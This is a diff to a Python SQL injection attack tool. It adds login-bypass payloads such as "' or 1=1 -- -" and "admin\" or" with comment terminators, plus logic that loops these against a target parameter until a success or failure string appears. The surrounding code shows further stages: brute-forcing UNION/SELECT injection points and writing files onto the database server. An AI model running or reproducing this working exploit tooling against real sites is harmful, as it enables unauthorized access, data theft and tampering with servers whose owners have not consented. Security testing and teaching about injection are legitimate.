@@ -21,7 +21,8 @@ arg_parser.add_argument("-H", dest="header", type=str, help="One or multiple hea
 arg_parser.add_argument("-c", "--cookies", dest="cookies", type=str, help="One or multiple cookies values for the request, separate with a space\nUse like 'PHPSESSID=shuv7rnuv UserToken=yes'")
 arg_parser.add_argument('-u','--url', dest='url', help='The url to use for sqli', required=True, type=str)
 arg_parser.add_argument('-p','--parameter', dest='parameter', help='The injectable parameter', required=True, type=str)
-arg_parser.add_argument('-b','--bypass', dest='bypass', help='Bypass the authentication.\n define the failed login message', type=str)
+arg_parser.add_argument('-ns','--not-string', dest='bypass', help='Define the failed login message. Script try sqli until this string is not in the request output', type=str)
+arg_parser.add_argument('-s','--string', dest='found', help='Define the successfully login message. Script try sqli until the string is in the request output', type=str)
 arg_parser.add_argument('-l','--level', dest='level', help='The level of the scan (l|h) "l" for little, and "h" for huge', default='l', type=str)
 arg_parser.add_argument('-v', '--verbose', dest='verbose', help='Define verbose output. set to False by default', type=str, default="FALSE")
 args = arg_parser.parse_args()
@@ -80,6 +81,7 @@ BRUTE_DOC_ROOT_SUFFIXES = ("", "html", "htdocs", "httpdocs", "php", "public", "s
 # SQLI brute force tempaltes
 SQLI_SELECT = ("name';SELECT ", "name';SELECT ", "name ;SELECT ", "name ;SELECT ", "-5314';SELECT ", "-5314';SELECT ", "-5314 ;SELECT ", "-5314 ;SELECT ")#
 SQLI_SELECT_UNION = ("-8408 UNION ALL SELECT ", "-8408' UNION ALL SELECT ", "name UNION ALL SELECT ", "name' UNION ALL SELECT ")#
+SQLI_OR_AND = ("' or  ","' Or  ","' oR  ","' ||  "," or  "," Or  "," oR  "," ||  ","' and  ","' And  ","' aNd  ","' anD  ","' &&  ","' %26%26  "," and  "," And  "," aNd  "," anD  "," &&  "," %26%26  ","admin\" or ")
 SQLI_COMMENT = ('#','/*','-- -','-- --',';%00','`')
 REQUEST= {}
 for param in args.data.split("&"):
@@ -113,6 +115,14 @@ def request_verify(request, verify,myhash,type):
     return True
   if (type == 1): # if verify file exists
     return False  
+  # if it's a blind sqli and we analyse with a special msg from output
+  if ("bypass" in verify.keys()): 
+    if ( verify["bypass"] not in output.lower() ): 
+      return True
+  # if it's a blind sqli and we analyse with a special msg from output
+  if ("found" in verify.keys()): 
+    if ( verify["found"] in output.lower() ): 
+      return True    
   # if its a blind sqli let's see about return code  
   if ("code_error" in verify.keys()):
     if ( request.status_code == verify["success_code"]):
@@ -178,13 +188,17 @@ code=req.status_code
 TYPE_VERIFY["success_code"]= code
 TYPE_VERIFY["content"] = req.headers['Content-Length']
 debug('The request without injection return code: '+str(code))
-
+bypass_or_found=False
+found = False
+HEAD1=""
+TAIL1=""
 # if bypass_authentification
 if args.bypass is not None:
-  found = False
-  for inject1 in BYPASS_AUTH:
+  bypass_or_found=True
+  msg= args.bypass
+  for inject1 in SQLI_OR_AND:
     for inject2 in SQLI_COMMENT:
-      inject = inject1+inject2
+      inject = inject1+"1=1 "+inject2
       debug('Injection string: '+inject1)
       REQUEST[args.parameter] = inject
       req=send_request() 
@@ -192,53 +206,94 @@ if args.bypass is not None:
       debug('The response code is: '+str(req.status_code))  
       output = req.content.lower()
       if (req.status_code != code or not args.bypass.lower() in output ):
+        if (req.status_code != code):
+          TYPE_VERIFY["code_error"] = req.status_code
+        else:
+          TYPE_VERIFY["bypass"] = args.bypass.lower()
         found = True
+        HEAD1=inject1
+        TAIL1=inject2
         debug('Success bypass authentication : '+inject)
         break
     if found:
       break
-  if found:
-    print colored('[Bypass-Authentication] Found a sqli injection to bypass the from: '+REQUEST[args.parameter], "green")
-    sys.exit(1)
-  else:
-    print colored('[Bypass-Authentication] All bypass injections Failed ', "red")
-    action="no"
-    action = raw_input("Do you want continue trying other sqli. 'No' by default: [y/n] ")
-    if action.lower() not in ('y','yes'):
-      sys.exit(1)  
+# if found string authentification
+if args.found is not None:
+  msg= args.found
+  bypass_or_found= True
+  for inject1 in SQLI_OR_AND:
+    for inject2 in SQLI_COMMENT:
+      inject = inject1+"1=1 "+inject2
+      debug('Injection string: '+inject1)
+      REQUEST[args.parameter] = inject
+      req=send_request() 
+      debug('The request data sent: '+str(REQUEST))
+      debug('The response code is: '+str(req.status_code))  
+      output = req.content.lower()
+      if (req.status_code != code or args.found.lower() in output ):
+        if (req.status_code != code):
+          TYPE_VERIFY["code_error"] = req.status_code
+        else:
+          TYPE_VERIFY["found"] = args.found.lower()
+        found = True
+        HEAD1=inject1
+        TAIL1=inject2
+        debug('Success bypass authentication : '+inject)
+        break
+    if found:
+      break
 
-# Verify if param injectable and define return error
-# try injections
-found = False
-errors = ['sql syntax', 'error:', 'syntax to use near', 'syntax error', 'cardinality violation', 'select statements']
-for inject in INJECT_TEST:
-  debug('Injection string: '+inject)
-  REQUEST[args.parameter] = inject
-  req=send_request() 
-  debug('The request data sent: '+str(REQUEST))
-  debug('The response code is: '+str(req.status_code))  
-  output = req.content.lower()
-  if (req.status_code != code or  any(err in output for err in errors) ):
-    if (req.status_code != code):
-       TYPE_VERIFY["code_error"] = req.status_code
-       found=True
-       break
-    else:
-       TYPE_VERIFY["output"] = errors
-       found=True
-       break
-if (found):
-  print colored('[SQLI] The parameter "'+args.parameter+'" is injectable', "green")
+if found and bypass_or_found:
+  print colored('[Bypass-Authentication] Found a sqli injection to bypass the from: '+REQUEST[args.parameter], "green")
   if ("code_error" in TYPE_VERIFY.keys()):
     print colored('[SQLI] Blind injection use code error to analyse injection', "yellow")
   else:
-    print colored('[SQLI] You can use the output errors to analyse the injection', "yellow")
-else:
-  print colored('[SQLI] The parameter "'+args.parameter+'" is not seems to be injectable', "red")
+    print colored('[SQLI] You can use the return message from DBMS "'+msg+'" to analyse the injection', "yellow")
   action="no"
-  action = raw_input("Do you want  continue trying anyway. 'No' by default: [y/n] ")
+  action = raw_input("Do you want continue for other options. 'No' by default: [y/n]")
   if action.lower() not in ('y','yes'):
     sys.exit(1)
+else:
+  print colored('[Bypass-Authentication] All bypass injections Failed ', "red")
+  action="no"
+  action = raw_input("Do you want continue trying other sqli. 'No' by default: [y/n] ")
+  if action.lower() not in ('y','yes'):
+    sys.exit(1)  
+
+# Verify if param injectable and define return error
+# try injections
+# verify if bypass dosent defined before 
+if args.bypass is None and args.found is None:
+  found = False
+  errors = ['sql syntax', 'error:', 'syntax to use near', 'syntax error', 'cardinality violation', 'select statements']
+  for inject in INJECT_TEST:
+    debug('Injection string: '+inject)
+    REQUEST[args.parameter] = inject
+    req=send_request() 
+    debug('The request data sent: '+str(REQUEST))
+    debug('The response code is: '+str(req.status_code))  
+    output = req.content.lower()
+    if (req.status_code != code or  any(err in output for err in errors) ):
+      if (req.status_code != code):
+         TYPE_VERIFY["code_error"] = req.status_code
+         found=True
+         break
+      else:
+         TYPE_VERIFY["output"] = errors
+         found=True
+         break
+  if (found):
+    print colored('[SQLI] The parameter "'+args.parameter+'" is injectable', "green")
+    if ("code_error" in TYPE_VERIFY.keys()):
+      print colored('[SQLI] Blind injection use code error to analyse injection', "yellow")
+    else:
+      print colored('[SQLI] You can use the output errors to analyse the injection', "yellow")
+  else:
+    print colored('[SQLI] The parameter "'+args.parameter+'" is not seems to be injectable', "red")
+    action="no"
+    action = raw_input("Do you want  continue trying anyway. 'No' by default: [y/n] ")
+    if action.lower() not in ('y','yes'):
+      sys.exit(1)
 
 ## Found a sqli request with bruteforce
 head=""
@@ -307,7 +362,14 @@ if (found):
   print colored('[Exploit] The Head: ('+head+') and the comment char: ('+tail+')', "green")
 else:     
   print colored('[SQLI] The parameter "'+args.parameter+'" is not injectable', "red")
-  sys.exit(1)
+  if args.bypass is not None or args.found is not None:
+    action="no"
+    action = raw_input("Do you want continue trying with ("+HEAD1+").  'No' by default: [y/n] ")
+    if action.lower() not in ('y','yes'):
+      sys.exit(1)
+    else:
+      head=head_vrfy= HEAD1
+      tail= TAIL1  
   
 # write a file in DBMS server
 if args.localpath is not None:
